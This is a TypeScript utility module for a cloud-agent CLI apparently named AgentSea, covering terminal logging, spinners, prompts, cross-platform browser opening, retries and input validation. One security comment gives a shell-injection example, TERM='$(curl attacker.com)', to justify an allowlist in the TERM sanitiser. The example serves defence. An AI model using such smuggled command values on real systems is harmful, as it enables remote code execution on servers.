// shared/ui.ts — Logging, prompts, and browser opening
// @clack/prompts is bundled into cli.js at build time.

import "../unicode-detect.js"; // Must run before @clack/prompts: configures TERM for unicode detection

import { randomUUID } from "node:crypto";
import { readFileSync } from "node:fs";
import * as p from "@clack/prompts";
import { isString } from "@agentsea/sdk";
import { parseJsonObj } from "./parse.js";
import { getAgentseaCloudConfigPath } from "./paths.js";
import { asyncTryCatch, tryCatch, unwrapOr } from "./result.js";
import { isAgentseaVerbose } from "./verbosity.js";
import { pickToTTY } from "../picker.js";
import { isWslLinux } from "./shell.js";
import { captureError, captureWarning } from "./telemetry.js";

const GREEN = "\x1b[0;32m";
const CYAN = "\x1b[0;36m";
const DIM = "\x1b[2m";
const NC = "\x1b[0m";

/** Operational detail — hidden unless `--verbose` or `AGENTSEA_VERBOSE=1`. */
export function logInfo(msg: string): void {
  if (!isAgentseaVerbose()) {
    return;
  }
  process.stderr.write(`${GREEN}${msg}${NC}\n`);
}

/** Log a debug message to stderr (dim text). Only visible when AGENTSEA_DEBUG=1. */
export function logDebug(msg: string): void {
  if (process.env.AGENTSEA_DEBUG === "1") {
    process.stderr.write(`${DIM}[debug] ${msg}${NC}\n`);
  }
}

/** Pass on every `p.log.*` so output matches spinners (`Loading manifest…`) — stderr only. */
export const CLACK_LOG_OPTS = {
  output: process.stderr,
} as const;

export function logWarn(msg: string): void {
  p.log.warn(msg, CLACK_LOG_OPTS);
  captureWarning(msg);
}

/** Reset stderr SGR after Clack log output so later writes don't inherit red/error styling. */
export function resetStderrAttributes(): void {
  if (process.stderr.isTTY) {
    process.stderr.write(NC);
  }
}

/**
 * Clack reads stdin (fd 0); on WSL ConPTY that stream often stops accepting keys
 * after spinners/log output. Resume cooked mode and re-open the read side.
 */
export function prepareStdinForClack(): void {
  process.stdin.removeAllListeners();
  if (process.stdin.isTTY) {
    tryCatch(() => process.stdin.setRawMode(false));
    process.stdin.resume();
    process.stdin.setEncoding("utf8");
  }
}

/**
 * Undo raw/paused stdin and Clack styling so the parent shell accepts input again
 * after prompts or an interactive child (Hermes TUI) exits.
 */
export function restoreInteractiveTerminal(): void {
  process.stdin.removeAllListeners();
  if (process.stdin.isTTY) {
    tryCatch(() => process.stdin.setRawMode(false));
    process.stdin.resume();
    process.stdin.setEncoding("utf8");
  }
  if (process.stderr.isTTY) {
    process.stderr.write("\x1b[0m\x1b[?25h");
  }
  if (process.stdout.isTTY) {
    process.stdout.write("\x1b[0m\x1b[?25h");
  }
  tryCatch(() =>
    Bun.spawnSync(["stty", "sane"], {
      stdio: "inherit",
    }),
  );
}

export function logError(msg: string): void {
  p.log.error(msg, CLACK_LOG_OPTS);
  resetStderrAttributes();
  captureError("log_error", msg);
}

/** Operational progress — hidden unless verbose (use {@link logAlwaysStep} for required UX). */
export function logStep(msg: string): void {
  if (!isAgentseaVerbose()) {
    return;
  }
  process.stderr.write(`${CYAN}${msg}${NC}\n`);
}

/** Important message always shown (URLs, confirmations, OAuth prompts). Uses Clack ● styling on stderr. */
export function logAlwaysInfo(msg: string): void {
  p.log.success(msg, CLACK_LOG_OPTS);
}

/** Important milestone lines — same ◇ rhythm as `Launching … on …`. */
export function logAlwaysStep(msg: string): void {
  p.log.step(msg, CLACK_LOG_OPTS);
}

/** Overwrite the current line with a status message (no newline). Call logStepDone() when finished.
 *  Falls back to newline-separated output when stderr is not a TTY (e.g., piped or captured). */
export function logStepInline(msg: string): void {
  if (!isAgentseaVerbose()) {
    return;
  }
  if (process.stderr.isTTY) {
    process.stderr.write(`\r${CYAN}${msg}${NC}\x1b[K`);
  } else {
    process.stderr.write(`${CYAN}${msg}${NC}\n`);
  }
}

/** End an inline status line by moving to the next line. */
export function logStepDone(): void {
  if (process.stderr.isTTY) {
    process.stderr.write("\r\x1b[K");
  }
}

/** Compact elapsed time for provision spinners (`45s`, `2m 15s`). */
export function formatProvisionElapsed(seconds: number): string {
  const s = Math.max(0, Math.floor(seconds));
  if (s < 60) {
    return `${s}s`;
  }
  const minutes = Math.floor(s / 60);
  const rem = s % 60;
  return rem > 0 ? `${minutes}m ${rem}s` : `${minutes}m`;
}

export type SpinnerHandle = {
  /** Sub-status shown beside the main spinner label (e.g. `check 3/60`). */
  setDetail: (detail: string) => void;
};

export type RunWithSpinnerOptions = {
  doneMessage?: string;
  failMessage?: string;
  /** Spinner label refresh interval. Default 1000ms. */
  tickMs?: number;
  /** Build the animated label; defaults to message + detail + elapsed. */
  formatMessage?: (ctx: { base: string; detail: string; elapsedSec: number }) => string;
};

function defaultSpinnerMessage(ctx: { base: string; detail: string; elapsedSec: number }): string {
  const elapsed = formatProvisionElapsed(ctx.elapsedSec);
  if (ctx.detail) {
    return `${ctx.base} — ${ctx.detail} (${elapsed})`;
  }
  return `${ctx.base} (${elapsed})`;
}

const UNICODE_SPINNER_FRAMES = ["◐", "◓", "◑", "◒"] as const;
const ASCII_SPINNER_FRAMES = ["|", "/", "-", "\\"] as const;
const SPINNER_ANIM_MS = 80;
const THROTTLED_STEP_MIN_GAP_MS = 3000;
const THROTTLED_STEP_HEARTBEAT_MS = 10_000;

type SpinnerMode = "inline" | "throttled" | "plain";

function spinnerFrames(): readonly string[] {
  return process.env.TERM === "linux" ? ASCII_SPINNER_FRAMES : UNICODE_SPINNER_FRAMES;
}

function resolveSpinnerMode(): SpinnerMode {
  if (!process.stderr.isTTY || process.env.AGENTSEA_NO_SPINNER === "1") {
    return "plain";
  }
  if (process.env.AGENTSEA_INLINE_SPINNER === "0") {
    return "throttled";
  }
  if (process.env.AGENTSEA_INLINE_SPINNER === "1") {
    return "inline";
  }
  // WSL ConPTY often ignores carriage returns on stderr (frames append horizontally).
  if (isWslLinux()) {
    return "throttled";
  }
  return "inline";
}

/** Prefer stdout on WSL when forcing inline — `\r` overwrite is more reliable there. */
function inlineSpinnerStream(): NodeJS.WriteStream {
  if (isWslLinux() && process.stdout.isTTY) {
    return process.stdout;
  }
  return process.stderr;
}

function clearInlineSpinnerLine(stream: NodeJS.WriteStream): void {
  stream.write("\r\x1b[K");
}

async function runInlineSpinner<T>(
  buildLabel: () => string,
  handle: SpinnerHandle,
  fn: (handle: SpinnerHandle) => Promise<T>,
  options: RunWithSpinnerOptions | undefined,
  message: string,
): Promise<T> {
  const stream = inlineSpinnerStream();
  const frames = spinnerFrames();
  let frameIdx = 0;
  const paintFrame = () => {
    const frame = frames[frameIdx % frames.length] ?? frames[0] ?? "…";
    frameIdx += 1;
    stream.write(`\r${frame}  ${buildLabel()}\x1b[K`);
  };

  paintFrame();
  const tickTimer = setInterval(paintFrame, SPINNER_ANIM_MS);

  const r = await asyncTryCatch(() => fn(handle));
  clearInterval(tickTimer);
  clearInlineSpinnerLine(stream);
  if (r.ok) {
    logAlwaysStep(options?.doneMessage ?? message.replace(/…$/, ""));
    return r.data;
  }
  logError(options?.failMessage ?? "Failed");
  throw r.error;
}

async function runThrottledStepSpinner<T>(
  buildLabel: () => string,
  handle: SpinnerHandle,
  fn: (handle: SpinnerHandle) => Promise<T>,
  options: RunWithSpinnerOptions | undefined,
  message: string,
): Promise<T> {
  let lastPrintedAt = 0;
  let lastPrintedDetail = "";

  const publish = (label: string, force = false) => {
    const now = Date.now();
    if (!force && now - lastPrintedAt < THROTTLED_STEP_MIN_GAP_MS) {
      return;
    }
    lastPrintedAt = now;
    logAlwaysStep(label);
  };

  publish(message, true);

  const wrappedHandle: SpinnerHandle = {
    setDetail(next: string) {
      handle.setDetail(next);
      if (next !== lastPrintedDetail) {
        lastPrintedDetail = next;
        publish(buildLabel());
      }
    },
  };

  const heartbeat = setInterval(() => publish(buildLabel()), THROTTLED_STEP_HEARTBEAT_MS);

  try {
    const r = await asyncTryCatch(() => fn(wrappedHandle));
    if (r.ok) {
      logAlwaysStep(options?.doneMessage ?? message.replace(/…$/, ""));
      return r.data;
    }
    logError(options?.failMessage ?? "Failed");
    throw r.error;
  } finally {
    clearInterval(heartbeat);
  }
}

/**
 * Run async work with progress feedback: inline spinner (TTY), throttled steps (WSL), or periodic lines.
 * Use {@link SpinnerHandle.setDetail} inside `fn` for incremental sub-status.
 */
export async function runWithSpinner<T>(
  message: string,
  fn: (handle: SpinnerHandle) => Promise<T>,
  options?: RunWithSpinnerOptions,
): Promise<T> {
  const tickMs = options?.tickMs ?? 1000;
  const formatMessage = options?.formatMessage ?? defaultSpinnerMessage;
  let detail = "";
  const handle: SpinnerHandle = {
    setDetail(next: string) {
      detail = next;
    },
  };

  const start = Date.now();
  const buildLabel = () =>
    formatMessage({
      base: message,
      detail,
      elapsedSec: Math.floor((Date.now() - start) / 1000),
    });

  const mode = resolveSpinnerMode();
  if (mode === "inline") {
    return runInlineSpinner(buildLabel, handle, fn, options, message);
  }
  if (mode === "throttled") {
    return runThrottledStepSpinner(buildLabel, handle, fn, options, message);
  }

  let fallbackTimer: ReturnType<typeof setInterval> | undefined;
  let lastFallbackLog = 0;
  logAlwaysStep(message);
  fallbackTimer = setInterval(() => {
    const elapsed = Math.floor((Date.now() - start) / 1000);
    if (elapsed - lastFallbackLog >= 5) {
      lastFallbackLog = elapsed;
      logAlwaysStep(buildLabel());
    }
  }, tickMs);

  try {
    return await fn(handle);
  } finally {
    if (fallbackTimer) {
      clearInterval(fallbackTimer);
    }
  }
}

/** Yes/no confirm via @clack/prompts — avoids nested free-text prompts that corrupt stdin after p.text. */
export async function confirm(message: string, initialValue = false): Promise<boolean> {
  if (process.env.AGENTSEA_NON_INTERACTIVE === "1") {
    throw new Error("Cannot prompt: AGENTSEA_NON_INTERACTIVE is set");
  }
  resetStderrAttributes();
  process.stderr.write("\n");
  const result = await p.confirm({
    message,
    initialValue,
  });
  if (p.isCancel(result)) {
    process.stderr.write("\n");
    process.exit(0);
  }
  return result === true;
}

/** Prompt for a line of user input. Throws if non-interactive.
 *  Uses @clack/prompts instead of Node readline to avoid Bun #1707
 *  where readline interfaces silently close after @clack/prompts runs
 *  (e.g., SSH key multiselect kills subsequent readline prompts).
 *  Rejects if stdin closes unexpectedly (e.g., post-clack state corruption)
 *  instead of hanging forever. */
export async function prompt(question: string): Promise<string> {
  if (process.env.AGENTSEA_NON_INTERACTIVE === "1") {
    throw new Error("Cannot prompt: AGENTSEA_NON_INTERACTIVE is set");
  }
  // Strip trailing ": " or ":" since clack adds its own formatting
  const message = question.replace(/:\s*$/, "").trim();

  // Race the prompt against stdin closing unexpectedly.
  // If stdin dies (e.g., after @clack/prompts corrupts its state),
  // the close listener rejects so we don't hang forever.
  let cleanupStdinListener: (() => void) | undefined;
  const stdinClosePromise = new Promise<never>((_resolve, reject) => {
    const onClose = () => {
      reject(new Error("stdin closed unexpectedly during prompt"));
    };
    process.stdin.once("close", onClose);
    cleanupStdinListener = () => {
      process.stdin.removeListener("close", onClose);
    };
  });

  const r = await asyncTryCatch(() =>
    Promise.race([
      p.text({
        message,
      }),
      stdinClosePromise,
    ]),
  );
  cleanupStdinListener?.();
  if (!r.ok) {
    throw r.error;
  }
  if (p.isCancel(r.data)) {
    process.stderr.write("\n");
    process.exit(0);
  }
  return (r.data || "").trim();
}

/**
 * Display an interactive select from pipe-delimited items.
 * Items format: "id|label" per line.
 * Uses @clack/prompts when available (local checkout), falls back to numbered list.
 * Returns the selected id.
 */
export async function selectFromList(items: string[], promptText: string, defaultValue: string): Promise<string> {
  if (items.length === 0) {
    return defaultValue;
  }

  const parsed = items.map((line) => {
    const parts = line.split("|");
    return {
      id: parts[0],
      label: parts.slice(1).join(" — "),
    };
  });

  if (parsed.length === 1) {
    if (isAgentseaVerbose()) {
      logInfo(`Using ${promptText}: ${parsed[0].id}`);
    }
    return parsed[0].id;
  }

  const result = await p.select({
    message: `Select ${promptText}`,
    options: parsed.map((item) => ({
      value: item.id,
      label: item.id,
      hint: item.label,
    })),
    initialValue: defaultValue,
  });

  if (p.isCancel(result)) {
    process.stderr.write("\n");
    process.exit(0);
  }
  return isString(result) ? result : String(result);
}

function tryFirstNonLoopbackIpv4FromHostnameDashI(): string | undefined {
  const result = Bun.spawnSync(["hostname", "-I"], {
    stdout: "pipe",
    stderr: "ignore",
  });
  if (result.exitCode !== 0) {
    return undefined;
  }
  const text = new TextDecoder().decode(result.stdout).trim();
  for (const raw of text.split(/\s+/)) {
    const part = raw.trim();
    if (!part || part.includes(":")) {
      continue;
    }
    if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(part)) {
      continue;
    }
    if (part.startsWith("127.") || part.startsWith("169.254.")) {
      continue;
    }
    return part;
  }
  return undefined;
}

/**
 * When agentsea runs in WSL, Windows Edge/Chrome resolve 127.0.0.1 on the host while
 * SSH -L listens inside the distro unless bound to all interfaces — use the WSL NIC IP instead.
 */
export function rewriteLocalhostHttpUrlForWindowsBrowserFromWsl(url: string): string {
  try {
    const u = new URL(url);
    if (u.protocol !== "http:" && u.protocol !== "https:") {
      return url;
    }
    if (u.hostname !== "127.0.0.1" && u.hostname !== "localhost") {
      return url;
    }
    const host = tryFirstNonLoopbackIpv4FromHostnameDashI();
    if (!host) {
      return url;
    }
    u.hostname = host;
    return u.href;
  } catch {
    return url;
  }
}

/**
 * Encode a PowerShell script for `-EncodedCommand` (UTF-16LE, no BOM — required by pwsh/ps 5.x).
 */
function powerShellUtf16LeBase64(script: string): string {
  return Buffer.from(script, "utf16le").toString("base64");
}

/**
 * Launch the default HTTP handler via PowerShell. Uses `-EncodedCommand` so wrappers never
 * see literal `?`, `&`, or `#` in argv (WSL→Windows interop and cmd chaining would otherwise
 * truncate OpenClaw bootstrap URLs after the first `&`).
 */
function powerShellOpenUrlCommand(url: string): [string, string[]] {
  const escapedForSingleQuoted = url.replace(/'/g, "''");
  const script = `Start-Process '${escapedForSingleQuoted}'`;
  return [
    "powershell.exe",
    [
      "-NoProfile",
      "-NonInteractive",
      "-EncodedCommand",
      powerShellUtf16LeBase64(script),
    ],
  ];
}

/** WSL-only: rewrite loopback URLs to the distro NIC IP for Windows browsers that cannot use mirrored localhost into WSL (legacy). Prefer loopback unless this is set — OpenClaw’s Control UI rejects unknown Origins otherwise. */
function shouldRewriteLoopbackOpenUrlForWsl(): boolean {
  return process.env.AGENTSEA_WSL_OPEN_BROWSER_LAN_IP === "1";
}

/** Open a URL in the user's browser. */
export function openBrowser(url: string): void {
  const windowsBrowserUrl =
    process.platform === "linux" && isWslLinux() && shouldRewriteLoopbackOpenUrlForWsl()
      ? rewriteLocalhostHttpUrlForWindowsBrowserFromWsl(url)
      : url;

  const linuxFallback: [
    string,
    string[],
  ][] = [
    [
      "xdg-open",
      [
        url,
      ],
    ],
    [
      "termux-open-url",
      [
        url,
      ],
    ],
  ];

  /** WSL: prefer Windows Chrome/Edge — xdg-open launches Linux Chromium inside the distro. */
  const wslAttempts: [
    string,
    string[],
  ][] = [
    powerShellOpenUrlCommand(windowsBrowserUrl),
    [
      "cmd.exe",
      [
        "/d",
        "/c",
        "start",
        "",
        windowsBrowserUrl,
      ],
    ],
  ];
  if (process.env.AGENTSEA_WSL_LINUX_BROWSER === "1") {
    wslAttempts.push(...linuxFallback);
  }

  /** Native Windows: never use `xdg-open` (not available). */
  const win32Attempts: [
    string,
    string[],
  ][] = [
    powerShellOpenUrlCommand(url),
    [
      "cmd.exe",
      [
        "/d",
        "/c",
        "start",
        "",
        url,
      ],
    ],
  ];

  const cmds: [
    string,
    string[],
  ][] =
    process.platform === "darwin"
      ? [
          [
            "open",
            [
              url,
            ],
          ],
        ]
      : process.platform === "win32"
        ? win32Attempts
        : process.platform === "linux" && isWslLinux()
          ? wslAttempts
          : linuxFallback;

  let opened = false;
  for (const [cmd, args] of cmds) {
    const r = tryCatch(() =>
      Bun.spawnSync(
        [
          cmd,
          ...args,
        ],
        {
          stdio: [
            "ignore",
            "ignore",
            "ignore",
          ],
        },
      ),
    );
    if (r.ok && r.data.exitCode === 0) {
      opened = true;
      break;
    }
  }

  const wslLanAlt =
    process.platform === "linux" && isWslLinux() ? rewriteLocalhostHttpUrlForWindowsBrowserFromWsl(url) : url;

  // Always show the URL as fallback (headless VMs, VNC, SSH sessions)
  if (opened) {
    logAlwaysStep(`If the browser didn't open, visit: ${url}`);
  } else {
    logAlwaysStep(`Please open: ${url}`);
    if (isWslLinux()) {
      if (wslLanAlt !== url) {
        logAlwaysStep(`If localhost fails here, try from Windows browser: ${wslLanAlt}`);
      }
    }
  }
}

// ─── Retry-or-quit ─────────────────────────────────────────────────────

/**
 * Prompt the user to retry or quit after a failure.
 * - Enter / "y" / anything else → returns (caller retries)
 * - "n" / "N" / Ctrl+C (empty) → throws (caller exits)
 *
 * In non-interactive mode, always throws immediately.
 */
export async function retryOrQuit(message: string): Promise<void> {
  if (process.env.AGENTSEA_NON_INTERACTIVE === "1") {
    throw new Error("Non-interactive mode: cannot retry");
  }
  const shouldRetry = await confirm(message, true);
  if (!shouldRetry) {
    throw new Error("User chose to exit");
  }
}

// ─── Result-based retry ────────────────────────────────────────────────

import type { Result } from "./result.js";

export { Err, Ok, type Result } from "./result.js";

/**
 * Phase-aware retry helper using the Result monad.
 *
 * - `fn` returns `Ok(value)` on success — stops retrying, returns `value`.
 * - `fn` returns `Err(error)` on a retryable failure — retries up to `maxAttempts`.
 * - `fn` **throws** on a non-retryable failure — immediately propagates (no retry).
 *
 * This lets each caller decide at the point of failure whether the error is
 * retryable (return Err) or fatal (throw), instead of relying on brittle
 * error-message pattern matching after the fact.
 */
export async function withRetry<T>(
  label: string,
  fn: () => Promise<Result<T>>,
  maxAttempts = 3,
  delaySec = 5,
  exponential = false,
): Promise<T> {
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    const result = await fn(); // throws → not retried (non-retryable)
    if (result.ok) {
      return result.data;
    }
    if (attempt >= maxAttempts) {
      throw result.error;
    }
    const delay = exponential ? delaySec * 2 ** (attempt - 1) : delaySec;
    logWarn(`${label} failed (attempt ${attempt}/${maxAttempts}), retrying in ${delay}s...`);
    await new Promise((r) => setTimeout(r, delay * 1000));
  }
  throw new Error("unreachable");
}

/**
 * Load an API token from the per-cloud config file.
 * Reads `api_key` or `token` field and validates allowed characters.
 * Returns null if the file is missing, unreadable, or the token is invalid.
 */
export function loadApiToken(cloud: string): string | null {
  return unwrapOr(
    tryCatch(() => {
      const data = parseJsonObj(readFileSync(getAgentseaCloudConfigPath(cloud), "utf-8"));
      if (!data) {
        return null;
      }
      const token = (isString(data.api_key) ? data.api_key : "") || (isString(data.token) ? data.token : "");
      if (!token) {
        return null;
      }
      if (!/^[a-zA-Z0-9._/@:+=, -]+$/.test(token)) {
        return null;
      }
      return token;
    }),
    null,
  );
}

/** POSIX single-quote escaping: wraps `s` in single quotes and escapes any
 *  embedded single quotes with the standard `'\''` technique.
 *
 *  Defense-in-depth: rejects null bytes which could truncate the string at
 *  the C/OS level even though callers already validate for them. */
export function shellQuote(s: string): string {
  if (/\0/.test(s)) {
    throw new Error("shellQuote: input must not contain null bytes");
  }
  return "'" + s.replace(/'/g, "'\\''") + "'";
}

/** JSON-escape a string (returns the quoted JSON string). */
export function jsonEscape(s: string): string {
  return JSON.stringify(s);
}

/** Validate server name: 3-63 chars, alphanumeric + dash, no leading/trailing dash. */
export function validateServerName(name: string): boolean {
  if (name.length < 3 || name.length > 63) {
    return false;
  }
  if (!/^[a-zA-Z0-9-]+$/.test(name)) {
    return false;
  }
  if (name.startsWith("-") || name.endsWith("-")) {
    return false;
  }
  return true;
}

/** Validate region name: 1-63 chars, alphanumeric + dash + underscore. */
export function validateRegionName(region: string): boolean {
  return /^[a-zA-Z0-9_-]{1,63}$/.test(region);
}

/**
 * MODEL_ID validation: catalogue slugs **`agent-standard`** and provider-scoped **`openai/gpt-5`**.
 * (The Grid `GET …/models` listing often omits the `vendor/` prefix; slugs alone must remain valid.)
 */
export function validateModelId(id: string): boolean {
  const t = id.trim();
  if (t.length < 1 || t.length > 200) {
    return false;
  }
  const segment = String.raw`(?:[a-zA-Z0-9][a-zA-Z0-9_.:-]*)`;
  if (new RegExp(`^${segment}$`).test(t)) {
    return true;
  }
  return new RegExp(`^${segment}\/${segment}$`).test(t);
}

const GRID_MODEL_OTHER = "__grid_agentsea_model_other__";

export type HarnessGridModelSelection = {
  primary?: string;
  utility?: string;
};

/**
 * Prompt separately for thinking (main) and heartbeat models from the catalogue.
 * Skips heartbeat when the agent profile has no utility tier.
 */
export async function promptHarnessGridModels(
  entries: Array<{ id: string; displayName?: string; funded: boolean }>,
  suggestedPrimary: string,
  agentSlug: string,
  options?: { heartbeatOnly?: boolean },
): Promise<HarnessGridModelSelection> {
  if (entries.length === 0) {
    return {};
  }

  const { agentSupportsHeartbeatModel, resolveGridInstrumentProfile } = await import("./grid-instruments.js");
  const profile = resolveGridInstrumentProfile(agentSlug);
  const catalogueIds = entries.map((entry) => entry.id);

  if (options?.heartbeatOnly) {
    if (!profile.utility) {
      return {};
    }
    const utilitySuggested = catalogueIds.includes(profile.utility) ? profile.utility : suggestedPrimary;
    const utility = await promptGridCatalogModelId(
      entries,
      utilitySuggested,
      agentSlug,
      "Which model for heartbeats?",
      profile.utility,
    );
    return utility ? { utility } : {};
  }

  const primary = await promptGridCatalogModelId(
    entries,
    suggestedPrimary,
    agentSlug,
    "Which model for thinking?",
    profile.primary,
  );
  if (!primary) {
    return {};
  }

  if (!agentSupportsHeartbeatModel(agentSlug) || !profile.utility) {
    return { primary };
  }

  const utilitySuggested = catalogueIds.includes(profile.utility) ? profile.utility : primary;
  const utility = await promptGridCatalogModelId(
    entries,
    utilitySuggested,
    agentSlug,
    "Which model for heartbeats?",
    profile.utility,
  );
  if (!utility) {
    return {};
  }

  return { primary, utility };
}

/**
 * Let the user choose a model from The Grid catalogue.
 * Unfunded models are shown with a hint; caller should gate provisioning on credits.
 */
export async function promptGridCatalogModelId(
  entries: Array<{ id: string; displayName?: string; funded: boolean }>,
  suggestedId: string,
  agentSlug?: string,
  message?: string,
  recommended?: string,
): Promise<string | undefined> {
  if (entries.length === 0) {
    return undefined;
  }

  let resolvedRecommended = recommended;
  if (!resolvedRecommended && agentSlug) {
    const { resolveGridInstrumentProfile } = await import("./grid-instruments.js");
    resolvedRecommended = resolveGridInstrumentProfile(agentSlug).primary;
  }

  const catalogueIds = entries.map((entry) => entry.id);
  const initial = catalogueIds.includes(suggestedId) ? suggestedId : catalogueIds[0]!;

  resetStderrAttributes();
  restoreInteractiveTerminal();
  process.stderr.write("\n");

  const promptMessage =
    message ??
    (resolvedRecommended
      ? `Which Grid model should this server use? (recommended: ${resolvedRecommended})`
      : "Which Grid model should this server use?");

  const selectOptions = [
    ...entries.map((entry) => ({
      value: entry.id,
      label: entry.id === resolvedRecommended ? `${entry.id} ★` : entry.id,
      hint:
        entry.id === resolvedRecommended
          ? "recommended for this agent"
          : entry.funded
            ? "credits available"
            : "no credits yet",
    })),
    {
      value: GRID_MODEL_OTHER,
      label: "Other…",
      hint: "enter a catalogue model id manually",
    },
  ];

  let choice: string | undefined;
  // WSL: @clack/prompts select renders but often cannot read keys on ConPTY — use /dev/tty picker.
  if (isWslLinux()) {
    choice = pickToTTY({
      message: promptMessage,
      options: selectOptions,
      defaultValue: initial,
    }) ?? undefined;
  } else {
    prepareStdinForClack();
    const picked = await p.select({
      message: promptMessage,
      options: selectOptions,
      initialValue: initial,
    });
    if (p.isCancel(picked)) {
      return undefined;
    }
    choice = picked;
  }

  if (choice === undefined) {
    return undefined;
  }

  if (choice !== GRID_MODEL_OTHER) {
    return choice;
  }

  for (;;) {
    const typed = await p.text({
      message: "Model ID (from The Grid catalogue)",
      placeholder: "provider/model-name",
      validate: (val) => {
        if (!val?.trim()) {
          return "Model ID is required";
        }
        if (!validateModelId(val.trim())) {
          return "Invalid format — use provider/model";
        }
        return undefined;
      },
    });
    if (p.isCancel(typed)) {
      return undefined;
    }
    if (typed.trim() && validateModelId(typed.trim())) {
      return typed.trim();
    }
  }
}

/** Convert display name to kebab-case. */
export function toKebabCase(name: string): string {
  return name
    .toLowerCase()
    .replace(/[^a-z0-9-]/g, "-")
    .replace(/-{2,}/g, "-")
    .replace(/^-|-$/g, "");
}

/**
 * DigitalOcean hostname (RFC 1123-ish): alphanumeric + hyphen, ≤63 chars.
 * Appends a full UUID suffix so ephemeral droplets are unique even when operators
 * reuse `--name`/labels like "retest". Trims kebab-case base only if necessary.
 */
export function dropletNameWithUuidSuffix(baseKebabInput: string): string {
  const uuid = randomUUID().toLowerCase();
  let base =
    typeof baseKebabInput === "string" && baseKebabInput.trim().length > 0 ? toKebabCase(baseKebabInput) : "";
  if (!base.length) {
    base = "agentsea";
  }

  const maxBase = Math.max(1, 63 - 1 - uuid.length);

  if (base.length > maxBase) {
    base = base.slice(0, maxBase).replace(/-+$/u, "");
  }
  if (!base.length) {
    base = "agentsea";
  }

  const candidate = `${base}-${uuid}`;
  if (validateServerName(candidate)) {
    return candidate;
  }
  const trimmedBase = candidate.slice(0, Math.min(base.length, 63 - 1 - uuid.length)).replace(/-+$/u, "") || "s";
  const retry = `${trimmedBase}-${uuid}`;
  if (validateServerName(retry)) {
    return retry;
  }
  return uuid.length >= 3 && uuid.length <= 63 && validateServerName(uuid) ? uuid : `s-${uuid.slice(0, 60)}`;
}

/**
 * Default hostname base for cloud resources: the installed agent (`hermes`), not `agentsea`.
 * AgentSea is implied by tooling; the droplet label should read as what's running on it.
 */
export function defaultCloudHostnameBase(agentSlug?: string): string {
  const slug = typeof agentSlug === "string" ? toKebabCase(agentSlug.trim()) : "";
  return slug || "agentsea";
}

/** Default in-app / prompt label — same as cloud hostname base (`hermes`). */
export function defaultAgentseaLabel(agentSlug: string): string {
  return defaultCloudHostnameBase(agentSlug);
}

/** Generate a default cloud hostname (`<agent>-<uuid>`, e.g. `hermes-<uuid>`). */
export function defaultAgentseaName(agentSlug?: string): string {
  return dropletNameWithUuidSuffix(defaultCloudHostnameBase(agentSlug));
}

/**
 * Get server name from a cloud-specific env var, falling back to AGENTSEA_NAME_KEBAB / defaultAgentseaName.
 * Every cloud module had an identical copy of this logic — now unified here.
 */
export function getServerNameFromEnv(cloudEnvVar: string): string {
  const cloudName = process.env[cloudEnvVar];
  if (cloudName) {
    if (!validateServerName(cloudName)) {
      logError(`Invalid ${cloudEnvVar}: '${cloudName}'`);
      throw new Error("Invalid server name");
    }
    if (isAgentseaVerbose()) {
      logInfo(`Using server name from environment: ${cloudName}`);
    }
    return cloudName;
  }

  const agentSlug = process.env.AGENTSEA_AGENT_SLUG?.trim();
  const kebab = process.env.AGENTSEA_NAME_KEBAB || (process.env.AGENTSEA_NAME ? toKebabCase(process.env.AGENTSEA_NAME) : "");
  return kebab || defaultAgentseaName(agentSlug || undefined);
}

/**
 * Prompt user for a agentsea name (or derive it non-interactively).
 * Every cloud module had an identical copy of this logic — now unified here.
 *
 * @param cloudLabel - Display label for the prompt (e.g. "AWS instance", "Hetzner server")
 */
export async function promptAgentseaNameShared(cloudLabel: string): Promise<void> {
  if (process.env.AGENTSEA_NAME_KEBAB) {
    return;
  }

  let kebab: string;
  const agentSlug = process.env.AGENTSEA_AGENT_SLUG?.trim();
  if (process.env.AGENTSEA_NON_INTERACTIVE === "1") {
    kebab =
      (process.env.AGENTSEA_NAME ? toKebabCase(process.env.AGENTSEA_NAME) : "") ||
      defaultAgentseaName(agentSlug || undefined);
  } else {
    const derived = process.env.AGENTSEA_NAME ? toKebabCase(process.env.AGENTSEA_NAME) : "";
    const fallback = derived || defaultAgentseaName(agentSlug || undefined);
    process.stderr.write("\n");
    const answer = await prompt(`${cloudLabel} name [${fallback}]: `);
    kebab = toKebabCase(answer || fallback) || defaultAgentseaName(agentSlug || undefined);
  }

  process.env.AGENTSEA_NAME_DISPLAY = kebab;
  process.env.AGENTSEA_NAME_KEBAB = kebab;
  if (isAgentseaVerbose()) {
    logInfo(`Using resource name: ${kebab}`);
  }
}

/** Known-safe TERM values — defense-in-depth allowlist. */
const SAFE_TERMS = new Set([
  "xterm-256color",
  "xterm",
  "screen-256color",
  "screen",
  "tmux-256color",
  "tmux",
  "linux",
  "vt100",
  "vt220",
  "dumb",
]);

/** Sanitize TERM value before interpolating into shell commands.
 *  SECURITY: Prevents shell injection via malicious TERM env vars
 *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server).
 *  Uses an explicit allowlist of known-safe values instead of a regex. */
export function sanitizeTermValue(term: string): string {
  if (SAFE_TERMS.has(term)) {
    return term;
  }
  return "xterm-256color";
}

/** Prepare stdin for clean handoff to an interactive child process.
 *  Removes listeners and resets raw mode so fd 0 is clean.
 *
 *  NOTE: Do NOT call process.stdin.destroy() here — it can corrupt fd 0
 *  so the child process (SSH) inherits a broken file descriptor.
 *  Do NOT call stty sane — it enables ixon (XON/XOFF flow control) which
 *  SSH may not fully override, causing periodic input pauses.
 *
 *  The interactive session uses spawnSync which blocks the event loop,
 *  so there's no fd 0 competition regardless of stream state. */
export function prepareStdinForHandoff(): void {
  // Remove any leftover keypress/data listeners (from @clack/prompts, readline, etc.)
  process.stdin.removeAllListeners();

  // Reset raw mode so the terminal is in cooked mode before SSH takes over.
  // SSH will set its own terminal mode when it starts.
  if (process.stdin.isTTY) {
    tryCatch(() => process.stdin.setRawMode(false));
  }

  // Stop the stream from reading, but do NOT destroy it (that can close fd 0).
  // Do NOT call unref() here — it allows the event loop to exit before an
  // async child process (agentseaBash) finishes. The agentseaInteractive path uses
  // spawnSync so the event loop is already blocked.
  process.stdin.pause();
}
